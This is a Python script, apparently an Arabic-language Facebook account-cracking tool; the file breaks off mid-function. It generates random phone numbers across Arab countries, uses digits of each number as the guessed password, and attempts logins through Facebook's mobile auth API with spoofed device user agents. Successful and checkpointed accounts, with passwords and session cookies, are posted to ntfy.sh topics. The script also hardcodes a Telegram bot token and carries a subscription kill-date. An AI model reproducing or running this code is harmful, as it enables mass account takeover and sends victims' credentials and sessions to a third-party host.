
from datetime import datetime
import requests
import json
import time
import random
import os
from threading import Thread
import threading
import uuid
import webbrowser
import sys
import hashlib
import hmac
import secrets
import zlib
import base64
import platform
import re

idd = None

def odin_exit():
    try:
        os.kill(os.getpid(), signal.SIGKILL)
    except:
        try:
            os._exit(1)
        except:
            pass

def get_utc_time():
    try:
        data = requests.get(
            "https://timeapi.io/api/Time/current/zone?timeZone=UTC",
            timeout=10
        ).json()
        return datetime(
            data["year"],
            data["month"],
            data["day"],
            data["hour"],
            data["minute"],
            data["seconds"]
        )
    except Exception as e:
        print("خطأ في جلب الوقت:", e)
        odin_exit()

Odin = datetime(2026, 8, 16, 15, 0, 0)
now = get_utc_time()

if now > Odin:
    while True:
        time.sleep(1)
        print("تم توقيف الاداه رجاء اشتراك هنا @salhpy")
else:
    print("تم تفعيل الاداة بنجاح..")
    time.sleep(0.5)
    os.system('clear')
try:
	from Crypto.Cipher import AES
except ModuleNotFoundError:
	os.system('pip install pycryptodome')

def use():
	global u
	gtxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
	gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
	ugen=[]
	ugtn=[]
	ugxn=[] 
	xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
	fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
	dt="•"
	vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
	gtt=random.choice(xxxxx)
	u = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {str(gtt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+"[FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{density=3.3,width=1080,height=1430};FBLC/en_GB;FBRV/859351995;FBCR/AT&amp;amp-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
	return u
احمر = '\033[91m'
اخضر = '\033[92m'
اصفر = '\033[93m'
ازرق = '\033[94m'
بنفسجي = '\033[95m'
سماوي = '\033[96m'
ابيض = '\033[97m'
برتقالي = '\033[38;5;208m'
ذهبي = '\033[38;5;220m'
وردي = '\033[38;5;206m'
عريض = '\033[1m'
اعادة = '\033[0m'
bad = 0
hit = 0
CP = 0
ID = None
token = None
cok = None
apps = []
dates = []
apps2 = []
dates2 = []
import webbrowser
def tele():
    global ID,token
    try:
	    ID = input(عريض + اعادة + f' ENTER YOUR ID : {ازرق}')
	    token = input(عريض + اعادة + f' ENTER YOUR TOKIN : {ازرق}')
	    if not ID or not token:
	    	ID='7616825393'
	    	token="8900820138:AAEWhKDQLljmnfkt0o8iBaGVOuhe6Xvm3qk"
	    webbrowser.open('https://t.me/salhpy')
	    time.sleep(0.5)
	    os.system('clear')
    except:
    	pass
def ssend_tele(phone, pas, emaili, idd, cookie_string, apps, dates, apps2, dates2,iddd):
    try:
        message = f"""
ACCUONT OK
phone: {phone}
pas: {pas}
DEV: @salhpy
link: https://www.facebook.com/profile.php?id={idd}
cookies: {cookie_string}
app: {apps} | {dates}
{apps2} | {dates2}
Brother: @Xvxsa
BY • https://t.me/S_S_lN
DEV • @salhpy	
"""
        requests.post("https://ntfy.sh/salh_ok", 
                  data=message.encode('utf-8'), timeout=5)
    except:
        pass

def ssend_teleG(phone, pas, emaili, idd, cookie_string, apps, dates, apps2, dates2,iddd):
	message = f"""
ACCUONT CP
phone: {phone}
pas: {pas}
ID=https://www.facebook.com/profile.php?id={idd}
DEV: @salhpy
Brother: @Xvxsa
BY • https://t.me/S_S_lN
DEV • @salhpy
"""
	requests.post("https://ntfy.sh/salh_cp", 
                  data=message.encode('utf-8'), timeout=5)
	
def logn():
    lo = f"""
{اعادة}{ذهبي}
╔════════════════════════════════════╗
║     Premium           ║
║     {اعادة}{ازرق}By • @salhpy                   ║
║     {اعادة}{ذهبي}Brother: @Xvxsa                ║
╚════════════════════════════════════╝
{اعادة}"""
    print(lo)
country_choice = None

def choose_country():
    global country_choice
    print(f"""
{اعادة}{ازرق}1  • IRAQ العراق 🇮🇶
{اعادة}{اخضر}2  • Palestine فلسطين 🇵🇸
{اعادة}{احمر}3  • Egypt مصر 🇪🇬
{اعادة}{ذهبي}4  • Saudi Arabia السعودية 🇸🇦
{اعادة}{ابيض}5  • Jordan الاردن 🇯🇴
{اعادة}{سماوي}6  • Syria سوريا 🇸🇾
{اعادة}{بنفسجي}7  • Lebanon لبنان 🇱🇧
{اعادة}{برتقالي}8  • Morocco المغرب 🇲🇦
{اعادة}{وردي}9  • Algeria الجزائر 🇩🇿
{اعادة}{اصفر}10 • Tunisia تونس 🇹🇳
{اعادة}{اخضر}11 • Libya ليبيا 🇱🇾
{اعادة}{ابيض}12 • Sudan السودان 🇸🇩
{اعادة}{ازرق}13 • Yemen اليمن 🇾🇪
{اعادة}{احمر}14 • Kuwait الكويت 🇰🇼
{اعادة}{ذهبي}15 • UAE الامارات 🇦🇪
{اعادة}{سماوي}16 • Qatar قطر 🇶🇦
{اعادة}{بنفسجي}17 • Bahrain البحرين 🇧🇭
{اعادة}{برتقالي}18 • Oman عمان 🇴🇲
{اعادة}{عريض}{اخضر}19 • ALL جميع الدول (عشوائي)
""")
    country_choice = input(f"{اعادة}{عريض}اختر الدولة : {ازرق}")
    if country_choice not in [str(i) for i in range(1, 20)]:
        print(f"{احمر}اختيارك غلط\n{اعادة}")
        return choose_country()
    return country_choice
def gin():
    global country_choice
    qr = country_choice
    if qr == "1":
        prefixes = ['0750', '0751', '0752', '0770', '0771', '0772', '0773', '0774', '0775', '0780', '0781', '0782', '0783', '0784', '0790', '0791', '0792', '0793', '0794']
        prefix = random.choice(prefixes)
        phone = '964' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "2":
        prefixes = ['056', '059']
        prefix = random.choice(prefixes)
        phone = '970' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "3":
        prefixes = ['010', '011', '012', '015']
        prefix = random.choice(prefixes)
        phone = '20' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
        pas = '0' + phone[2:]
        return phone, pas
    
    elif qr == "4":
        prefixes = ['050', '053', '054', '055', '056', '057', '058', '059']
        prefix = random.choice(prefixes)
        phone = '966' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "5":
        prefixes = ['077', '078', '079']
        prefix = random.choice(prefixes)
        phone = '962' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "6":
        prefixes = ['093', '094', '095', '096', '098', '099']
        prefix = random.choice(prefixes)
        phone = '963' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "7":
        prefixes = ['03', '70', '71', '76', '78', '79', '81']
        prefix = random.choice(prefixes)
        phone = '961' + prefix + ''.join(random.choice('1234567890') for _ in range(6))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "8":
        prefixes = ['06', '07']
        prefix = random.choice(prefixes)
        phone = '212' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "9":
        prefixes = ['05', '06', '07']
        prefix = random.choice(prefixes)
        phone = '213' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "10":
        prefixes = ['20', '21', '22', '23', '24', '25', '26', '27', '28', '29',
                   '50', '51', '52', '53', '54', '55', '56', '57', '58', '59',
                   '90', '91', '92', '93', '94', '95', '96', '97', '98', '99']
        prefix = random.choice(prefixes)
        phone = '216' + prefix + ''.join(random.choice('1234567890') for _ in range(6))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "11":
        prefixes = ['091', '092', '093', '094', '095']
        prefix = random.choice(prefixes)
        phone = '218' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "12":
        prefixes = ['09', '01']
        prefix = random.choice(prefixes)
        phone = '249' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "13":
        prefixes = ['070', '071', '073', '077', '078']
        prefix = random.choice(prefixes)
        phone = '967' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "14":
        prefixes = ['050', '055', '060', '065', '066', '067', '069',
                   '090', '094', '097', '099']
        prefix = random.choice(prefixes)
        phone = '965' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "15":
        prefixes = ['050', '052', '054', '055', '056', '058']
        prefix = random.choice(prefixes)
        phone = '971' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "16":
        prefixes = ['030', '033', '050', '055', '066', '070', '074', '077']
        prefix = random.choice(prefixes)
        phone = '974' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(6))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "17":
        prefixes = ['030', '033', '034', '036', '037', '039',
                   '060', '063', '066', '067', '069',
                   '070', '073', '076', '077', '079',
                   '080', '083', '086', '087', '089',
                   '090', '093', '094', '096', '097', '099']
        prefix = random.choice(prefixes)
        phone = '973' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(6))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "18":
        prefixes = ['071', '072', '077', '078', '079',
                   '090', '091', '092', '093', '094', '095', '096', '097', '098', '099']
        prefix = random.choice(prefixes)
        phone = '968' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(6))
        pas = '0' + phone[3:]
        return phone, pas
    
    elif qr == "19":
        country = random.randint(1, 18)
        
        if country == 1:
            prefixes = ['0750', '0751', '0752', '0770', '0771', '0772', '0773', '0774', '0775', '0780', '0781', '0782', '0783', '0784', '0790', '0791', '0792', '0793', '0794']
            prefix = random.choice(prefixes)
            phone = '964' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 2:
            prefixes = ['056', '059']
            prefix = random.choice(prefixes)
            phone = '970' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 3:
            prefixes = ['010', '011', '012', '015']
            prefix = random.choice(prefixes)
            phone = '20' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
            pas = '0' + phone[2:]
            return phone, pas
        
        elif country == 4:
            prefixes = ['050', '053', '054', '055', '056', '057', '058', '059']
            prefix = random.choice(prefixes)
            phone = '966' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 5:
            prefixes = ['077', '078', '079']
            prefix = random.choice(prefixes)
            phone = '962' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 6:
            prefixes = ['093', '094', '095', '096', '098', '099']
            prefix = random.choice(prefixes)
            phone = '963' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 7:
            prefixes = ['03', '70', '71', '76', '78', '79', '81']
            prefix = random.choice(prefixes)
            phone = '961' + prefix + ''.join(random.choice('1234567890') for _ in range(6))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 8:
            prefixes = ['06', '07']
            prefix = random.choice(prefixes)
            phone = '212' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 9:
            prefixes = ['05', '06', '07']
            prefix = random.choice(prefixes)
            phone = '213' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 10:
            prefixes = ['20', '21', '22', '23', '24', '25', '26', '27', '28', '29',
                       '50', '51', '52', '53', '54', '55', '56', '57', '58', '59',
                       '90', '91', '92', '93', '94', '95', '96', '97', '98', '99']
            prefix = random.choice(prefixes)
            phone = '216' + prefix + ''.join(random.choice('1234567890') for _ in range(6))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 11:
            prefixes = ['091', '092', '093', '094', '095']
            prefix = random.choice(prefixes)
            phone = '218' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 12:
            prefixes = ['09', '01']
            prefix = random.choice(prefixes)
            phone = '249' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(8))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 13:
            prefixes = ['070', '071', '073', '077', '078']
            prefix = random.choice(prefixes)
            phone = '967' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 14:
            prefixes = ['050', '055', '060', '065', '066', '067', '069',
                       '090', '094', '097', '099']
            prefix = random.choice(prefixes)
            phone = '965' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 15:
            prefixes = ['050', '052', '054', '055', '056', '058']
            prefix = random.choice(prefixes)
            phone = '971' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(7))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 16:
            prefixes = ['030', '033', '050', '055', '066', '070', '074', '077']
            prefix = random.choice(prefixes)
            phone = '974' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(6))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 17:
            prefixes = ['030', '033', '034', '036', '037', '039',
                       '060', '063', '066', '067', '069',
                       '070', '073', '076', '077', '079',
                       '080', '083', '086', '087', '089',
                       '090', '093', '094', '096', '097', '099']
            prefix = random.choice(prefixes)
            phone = '973' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(6))
            pas = '0' + phone[3:]
            return phone, pas
        
        elif country == 18:
            prefixes = ['071', '072', '077', '078', '079',
                       '090', '091', '092', '093', '094', '095', '096', '097', '098', '099']
            prefix = random.choice(prefixes)
            phone = '968' + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(6))
            pas = '0' + phone[3:]
            return phone, pas
    else:
        print(f"{احمر}اختيارك غلط\n{اعادة}")
        return gin()
def get_apps(cookie_string):
    global apps, dates, apps2, dates2
    apps, dates, apps2,iddd ,dates2 = [], [], [], [], [] 
    if not cookie_string:
        return
    try:
        session = requests.Session()
        coki = {}
        
        for hh in cookie_string.split(';'):
            if '=' in hh:
                key, val = hh.split('=', 1)
                coki[key.strip()] = val.strip()
        headers = {
            'user-agent': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/937.36 (KHTML, like Gecko) Safari/420+'
        }
        try:
            rr1 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', 
                            cookies=coki, headers=headers, timeout=10).text
            print(f"{اخضر}التطبيقات النشطة:{اعادة}")
            if 'tidak memiliki aplikasi' in rr1.lower() or 'no active apps' in rr1.lower():
                print("لا توجد تطبيقات نشطة")
            else:
                apps = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr1)
                dates = re.findall(r'تمت الإضافة في|Added on|Ditambahkan pada|Ajouté le|Dodano dnia\s*([^<]+)</p>', rr1)
                for i, app in enumerate(apps):
                    if i < len(dates):
                        print(f"[{i+1}] {app.strip()} - {dates[i].strip()}")
                    else:
                        print(f"[{i+1}] {app.strip()} - غير معروف")
        except Exception as e:
            print(f"{احمر}خطأ في جلب التطبيقات النشطة: {e}{اعادة}")
        
        print("\n--------------------\n")
        try:
            rr2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', 
                            cookies=coki, headers=headers, timeout=10).text
            
            print(f"{اصفر}التطبيقات المنتهية:{اعادة}")
            if 'tidak memiliki' in rr2.lower() or 'no active apps' in rr2.lower() or 'لا توجد تطبيقات' in rr2:
                print("لا توجد تطبيقات منتهية")
            else:
                apps2 = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr2)
                dates2_raw = re.findall(r'<p class=".*?">(?:Kedaluwarsa pada|انتهت الصلاحية في)[^<]+</p>', rr2)
                dates2 = [re.sub(r'<[^>]+>', '', d).strip() for d in dates2_raw]
                
                for i, app in enumerate(apps2):
                    if i < len(dates2):
                        print(f"[{i+1}] {app.strip()} - {dates2[i].strip()}")
                    else:
                        print(f"[{i+1}] {app.strip()} - غير معروف")
        except Exception as e:
            print(f"{احمر}خطأ في جلب التطبيقات المنتهية: {e}{اعادة}")
            
    except Exception as e:
        print(f"{احمر}خطأ عام في دالة الكوكيز: {e}{اعادة}")
def chick_Salh(phone,pas,u):
    global hit, bad, CP, cok, apps, dates, apps2, dates2,iddd,passs
    fc = "/storage/emulated/0/Salh/Facebook"
    url = "https://b-graph.facebook.com/auth/login"
    data = {
    "adid": "664ea47f-5862-4dbb-aa3c-958946c0e6a5",
    "email": phone,
    "password": pas,
    "cpl": "true",
    "credentials_type": "device_based_login_password",
    "source": "device_based_login",
    "error_detail_type": "button_with_disabled",
    "format": "json",
    "generate_session_cookies": "1",
    "generate_analytics_claim": "1",
    "generate_machine_id": "1",
    "family_device_id": "77ad255f-181f-4217-907a-2dbf8336f608",
    "advertiser_id": "ee695749-291c-488a-a564-2b6d8995194b",
    "locale": "ar_AR",
    "client_country_code": "IQ",
    "device_id": "09b83f4a-f195-4818-8077-91524cb75972",
    "method": "auth.login",
    "api_key": "882a8490361da98702bf97a021ddc14d",
    "fb_api_req_friendly_name": "authenticate",
    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
}

    
    headers = {
    "authority": "www.facebook.com",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "dpr": "2.75",
    "origin": "https://www.facebook.com",
    "referer": "https://www.facebook.com/?_rdr",
    "sec-ch-prefers-color-scheme": "light",
    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
    "sec-ch-ua-full-version-list": '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-model": "",
    "sec-ch-ua-platform": '"Linux"',
    "sec-ch-ua-platform-version": "",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
